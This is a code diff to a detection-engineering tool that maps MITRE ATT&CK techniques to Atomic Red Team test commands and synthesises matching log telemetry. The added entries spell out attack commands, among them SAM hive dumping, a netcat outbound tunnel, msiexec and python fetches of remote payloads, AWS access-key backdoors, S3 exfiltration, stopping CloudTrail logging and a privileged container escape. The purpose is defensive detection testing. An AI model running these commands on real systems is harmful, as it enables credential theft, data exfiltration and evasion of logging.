@@ -27,6 +27,14 @@ ATOMIC_TESTS_MAP: Dict[str, List[Dict[str, str]]] = {
             "telemetry": "Sysmon Event ID 10 / Process Creation Event ID 4688 (rundll32.exe loading comsvcs.dll)",
         },
     ],
+    "T1003.002": [
+        {
+            "name": "Dump SAM and SYSTEM Registry Hives using reg.exe",
+            "test_id": "ART T1003.002 #1",
+            "command": "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save && reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save",
+            "telemetry": "Sysmon Event ID 1 (reg.exe save) / Event ID 11 (File creation of sam.save)",
+        },
+    ],
     "T1059.001": [
         {
             "name": "PowerShell Download and Execute",
@@ -87,6 +95,30 @@ ATOMIC_TESTS_MAP: Dict[str, List[Dict[str, str]]] = {
             "test_id": "ART T1078 #1",
             "command": "net user /add atomic_hunter TempPass123! && net localgroup administrators atomic_hunter /add",
             "telemetry": "Windows Event ID 4720 (A user account was created) / 4728 (Member added to security group)",
+        },
+    ],
+    "T1078.004": [
+        {
+            "name": "AWS IAM User or Access Key Backdoor Creation",
+            "test_id": "ART T1078.004 #1",
+            "command": "aws iam create-access-key --user-name target_user",
+            "telemetry": "AWS CloudTrail (eventSource: iam.amazonaws.com, eventName: CreateAccessKey)",
+        },
+    ],
+    "T1530": [
+        {
+            "name": "Cloud Storage Object Exfiltration",
+            "test_id": "ART T1530 #1",
+            "command": "aws s3 cp s3://target-bucket/sensitive.csv /tmp/sensitive.csv",
+            "telemetry": "AWS CloudTrail S3 Data Events (eventName: GetObject) / GCP Audit storage.objects.get",
+        },
+    ],
+    "T1562.008": [
+        {
+            "name": "Disable Cloud Logging / Stop CloudTrail",
+            "test_id": "ART T1562.008 #1",
+            "command": "aws cloudtrail stop-logging --name production-trail",
+            "telemetry": "AWS CloudTrail (eventSource: cloudtrail.amazonaws.com, eventName: StopLogging)",
         },
     ],
     "T1558.003": [
@@ -153,14 +185,14 @@ ATOMIC_TESTS_MAP: Dict[str, List[Dict[str, str]]] = {
         {
             "name": "Exploitation of Public-Facing Web Application Endpoint",
             "test_id": "ART T1190 #1",
-            "command": "curl -X POST http://127.0.0.1:8080/ping.php -d 'action=test'",
-            "telemetry": "Webserver Access Log (cs-method: POST, cs-uri-stem: /ping.php) / Process Execution",
+            "command": "curl -X POST http://127.0.0.1:8080/vulnerable -d 'cmd=id'",
+            "telemetry": "Webserver Access Log (cs-method: POST, anomalous URI / request body) / Process Execution",
         },
         {
             "name": "Web Server Worker Spawning Interactive Command Shell",
             "test_id": "ART T1190 #2",
             "command": "/bin/sh -c id",
-            "telemetry": "Sysmon Linux Event ID 1 (ParentImage: /usr/sbin/php-fpm, Image: /bin/sh)",
+            "telemetry": "Sysmon Linux Event ID 1 (ParentImage: web worker e.g. php-fpm/nginx, Image: /bin/sh)",
         },
     ],
     "T1574.002": [
@@ -273,6 +305,96 @@ ATOMIC_TESTS_MAP: Dict[str, List[Dict[str, str]]] = {
             "test_id": "ART T1610 #1",
             "command": "docker run --rm --privileged -v /:/host ubuntu:latest nsenter --target 1 --mount -- /bin/bash",
             "telemetry": "Container Runtime telemetry (Image: ubuntu:latest, Privileged: true, VolumeMount: /:/host)",
+        },
+    ],
+    "T1033": [
+        {
+            "name": "System Owner / User Discovery via whoami",
+            "test_id": "ART T1033 #1",
+            "command": "whoami /all",
+            "telemetry": "Windows Event ID 4688 / Sysmon Event ID 1 (Image: whoami.exe, CommandLine: whoami /all)",
+        },
+        {
+            "name": "User Discovery via Native Commands on Linux",
+            "test_id": "ART T1033 #2",
+            "command": "whoami && id",
+            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /usr/bin/whoami, CommandLine: whoami)",
+        },
+    ],
+    "T1059.006": [
+        {
+            "name": "Python Inline Code Execution with Network Fetch",
+            "test_id": "ART T1059.006 #1",
+            "command": "python.exe -c \"import urllib.request; urllib.request.urlopen('http://example.com/stage')\"",
+            "telemetry": "Sysmon Event ID 1 (Image: python.exe, CommandLine with -c argument) / Sysmon Event ID 3 (Network connection)",
+        },
+        {
+            "name": "Python Interactive Shell or Subprocess Invocation on Linux",
+            "test_id": "ART T1059.006 #2",
+            "command": "python3 -c \"import os; os.system('whoami')\"",
+            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /usr/bin/python3, CommandLine with -c argument)",
+        },
+    ],
+    "T1090": [
+        {
+            "name": "Port Forwarding and Proxy via Netsh",
+            "test_id": "ART T1090 #1",
+            "command": "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.1",
+            "telemetry": "Sysmon Event ID 1 (netsh.exe with portproxy add) / Event ID 13 (Registry modification in Services\\PortProxy)",
+        },
+        {
+            "name": "SOCKS Proxy Tunneling via SSH on Linux",
+            "test_id": "ART T1090 #2",
+            "command": "ssh -N -D 1080 user@proxy.example.com",
+            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /usr/bin/ssh, CommandLine with -D)",
+        },
+    ],
+    "T1095": [
+        {
+            "name": "ICMP Data Exfiltration / Echo Request Tunneling on Linux",
+            "test_id": "ART T1095 #1",
+            "command": "ping -c 4 -p 616263646566 198.51.100.1",
+            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /bin/ping) / Network flow: ICMP payload pattern",
+        },
+        {
+            "name": "Raw Socket / Netcat Outbound Tunnel on Linux",
+            "test_id": "ART T1095 #2",
+            "command": "nc -nv 198.51.100.1 4444",
+            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /usr/bin/nc) / Network flow: non-standard port",
+        },
+        {
+            "name": "ICMP Echo Payload via Windows Ping",
+            "test_id": "ART T1095 #3",
+            "command": "ping.exe -n 4 -l 128 198.51.100.1",
+            "telemetry": "Sysmon Event ID 1 (Image: PING.EXE, CommandLine with -l) / Network flow: ICMP buffer size",
+        },
+    ],
+    "T1021.007": [
+        {
+            "name": "AWS Systems Manager Remote Session Start",
+            "test_id": "ART T1021.007 #1",
+            "command": "aws ssm start-session --target i-0123456789abcdef0",
+            "telemetry": "AWS CloudTrail (eventName: StartSession, eventSource: ssm.amazonaws.com) / Host agent process execution",
+        },
+        {
+            "name": "Azure Bastion Host SSH Connection",
+            "test_id": "ART T1021.007 #2",
+            "command": "az network bastion ssh --name myBastion --resource-group myRG --target-resource-id /subscriptions/sub/resourceGroups/rg/providers/Microsoft.Compute/virtualMachines/vm1",
+            "telemetry": "Azure Activity Log (Microsoft.Network/bastionHosts) / Host logon",
+        },
+    ],
+    "T1546.016": [
+        {
+            "name": "Windows Installer Quiet Package Execution via msiexec",
+            "test_id": "ART T1546.016 #1",
+            "command": "msiexec.exe /quiet /i C:\\Windows\\Temp\\malicious.msi",
+            "telemetry": "Sysmon Event ID 1 (Image: msiexec.exe, CommandLine with /quiet or /q and /i) / Event ID 11 (File creation in Temp)",
+        },
+        {
+            "name": "Windows Installer Remote Package Download and Install",
+            "test_id": "ART T1546.016 #2",
+            "command": "msiexec.exe /q /i http://example.com/payload.msi",
+            "telemetry": "Sysmon Event ID 1 (msiexec.exe) / Sysmon Event ID 3 (Network connection to external HTTP endpoint)",
         },
     ],
 }
@@ -836,8 +958,8 @@ def synthesize_atomic_telemetry(
             "webserver",
             {
                 "cs-method": "POST",
-                "cs-uri-stem": "/ping.php",
-                "c-uri": "http://127.0.0.1:8080/ping.php",
+                "cs-uri-stem": "/vulnerable",
+                "c-uri": "http://127.0.0.1:8080/vulnerable",
                 "sc-status": "200",
             },
         )
@@ -850,13 +972,310 @@ def synthesize_atomic_telemetry(
                 "User": "www-data",
             },
         )
+    elif tid == "T1033":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\whoami.exe",
+                "CommandLine": "whoami /all",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/whoami",
+                "CommandLine": "whoami",
+                "ParentImage": "/bin/bash",
+                "User": "nobody",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/id",
+                "CommandLine": "id",
+                "ParentImage": "/bin/sh",
+                "User": "nobody",
+            },
+        )
+    elif tid in ("T1059.006", "T1059"):
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Python312\\python.exe",
+                "CommandLine": "python.exe -c \"import urllib.request; urllib.request.urlopen('http://example.com/stage')\"",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
         add(
             "process_creation",
             {
                 "Image": "/usr/bin/python3",
-                "CommandLine": "python3 tooling/checker/checker.py",
+                "CommandLine": "python3 -c \"import os; os.system('whoami')\"",
                 "ParentImage": "/bin/bash",
-                "User": "app",
+            },
+        )
+        add(
+            "network_connection",
+            {
+                "DestinationHostname": "example.com",
+                "DestinationPort": 80,
+                "Image": "python.exe",
+            },
+        )
+    elif tid in ("T1090", "T1090.001", "T1090.002", "T1090.003"):
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\netsh.exe",
+                "CommandLine": "netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.1",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "registry_set",
+            {
+                "TargetObject": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\\0.0.0.0/8080",
+                "Details": "192.168.1.1/80",
+                "Image": "netsh.exe",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/ssh",
+                "CommandLine": "ssh -N -D 1080 user@proxy.example.com",
+                "ParentImage": "/bin/bash",
+            },
+        )
+        add(
+            "network_connection",
+            {
+                "DestinationHostname": "proxy.example.com",
+                "DestinationPort": 1080,
+                "Image": "ssh",
+            },
+        )
+    elif tid == "T1095":
+        add(
+            "process_creation",
+            {
+                "Image": "/bin/ping",
+                "CommandLine": "ping -c 4 -p 616263646566 198.51.100.1",
+                "ParentImage": "/bin/bash",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\PING.EXE",
+                "CommandLine": "ping.exe -n 4 -l 128 198.51.100.1",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/nc",
+                "CommandLine": "nc -nv 198.51.100.1 4444",
+                "ParentImage": "/bin/bash",
+            },
+        )
+        add(
+            "network_connection",
+            {
+                "DestinationIp": "198.51.100.1",
+                "DestinationPort": 4444,
+                "Protocol": "tcp",
+                "Image": "nc",
+            },
+        )
+    elif tid in ("T1021.007", "T1021"):
+        add(
+            "cloud_audit",
+            {
+                "eventSource": "ssm.amazonaws.com",
+                "eventName": "StartSession",
+                "userIdentity.type": "AssumedRole",
+                "requestParameters.target": "i-0123456789abcdef0",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/amazon-ssm-agent",
+                "CommandLine": "/usr/bin/ssm-session-worker",
+                "ParentImage": "/usr/bin/amazon-ssm-agent",
+                "User": "root",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe",
+                "CommandLine": "amazon-ssm-agent.exe",
+                "ParentImage": "C:\\Windows\\System32\\services.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+            },
+        )
+    elif tid == "T1546.016":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\msiexec.exe",
+                "CommandLine": "msiexec.exe /quiet /i C:\\Windows\\Temp\\malicious.msi",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\msiexec.exe",
+                "CommandLine": "msiexec.exe /q /i http://example.com/payload.msi",
+                "ParentImage": "C:\\Windows\\explorer.exe",
+            },
+        )
+        add(
+            "file_event",
+            {
+                "TargetFilename": "C:\\Windows\\Temp\\malicious.msi",
+                "Image": "C:\\Windows\\System32\\msiexec.exe",
+            },
+        )
+        add(
+            "network_connection",
+            {
+                "DestinationHostname": "example.com",
+                "DestinationPort": 80,
+                "Image": "msiexec.exe",
+            },
+        )
+    elif tid == "T1055":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\mavinject.exe",
+                "CommandLine": "mavinject.exe 3128 /INJECTRUNNING C:\\Windows\\Temp\\inject.dll",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "process_access",
+            {
+                "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+                "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+                "GrantedAccess": "0x1F0FFF",
+            },
+        )
+        add(
+            "create_remote_thread",
+            {
+                "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+                "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+                "StartAddress": "0x00007FF712340000",
+            },
+        )
+    elif tid == "T1003.002":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\reg.exe",
+                "CommandLine": "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\reg.exe",
+                "CommandLine": "reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+            },
+        )
+        add(
+            "file_event",
+            {
+                "TargetFilename": "C:\\Windows\\Temp\\sam.save",
+                "Image": "C:\\Windows\\System32\\reg.exe",
+            },
+        )
+    elif tid == "T1021.002":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\net.exe",
+                "CommandLine": "net.exe use \\\\10.0.0.5\\C$ /user:domain\\admin password",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "network_connection",
+            {
+                "DestinationIp": "10.0.0.5",
+                "DestinationPort": 445,
+                "Image": "net.exe",
+                "Protocol": "tcp",
+            },
+        )
+    elif tid == "T1078.004":
+        add(
+            "cloud_audit",
+            {
+                "eventSource": "iam.amazonaws.com",
+                "eventName": "CreateAccessKey",
+                "userIdentity.type": "IAMUser",
+                "requestParameters.userName": "target_user",
+                "awsRegion": "us-east-1",
+            },
+        )
+        add(
+            "cloud_audit",
+            {
+                "protoPayload.serviceName": "iam.googleapis.com",
+                "protoPayload.methodName": "google.iam.admin.v1.CreateServiceAccountKey",
+                "protoPayload.authenticationInfo.principalEmail": "admin@example.com",
+            },
+        )
+    elif tid == "T1530":
+        add(
+            "cloud_audit",
+            {
+                "eventSource": "s3.amazonaws.com",
+                "eventName": "GetObject",
+                "userIdentity.type": "AssumedRole",
+                "requestParameters.bucketName": "target-bucket",
+                "requestParameters.key": "sensitive.csv",
+            },
+        )
+        add(
+            "cloud_audit",
+            {
+                "protoPayload.serviceName": "storage.googleapis.com",
+                "protoPayload.methodName": "storage.objects.get",
+                "protoPayload.resourceName": "projects/_/buckets/target-bucket/objects/sensitive.csv",
+            },
+        )
+    elif tid == "T1562.008":
+        add(
+            "cloud_audit",
+            {
+                "eventSource": "cloudtrail.amazonaws.com",
+                "eventName": "StopLogging",
+                "userIdentity.type": "IAMUser",
+                "requestParameters.name": "production-trail",
+            },
+        )
+        add(
+            "cloud_audit",
+            {
+                "protoPayload.serviceName": "logging.googleapis.com",
+                "protoPayload.methodName": "google.logging.v2.ConfigServiceV2.DeleteSink",
+                "protoPayload.authenticationInfo.principalEmail": "admin@example.com",
             },
         )
 
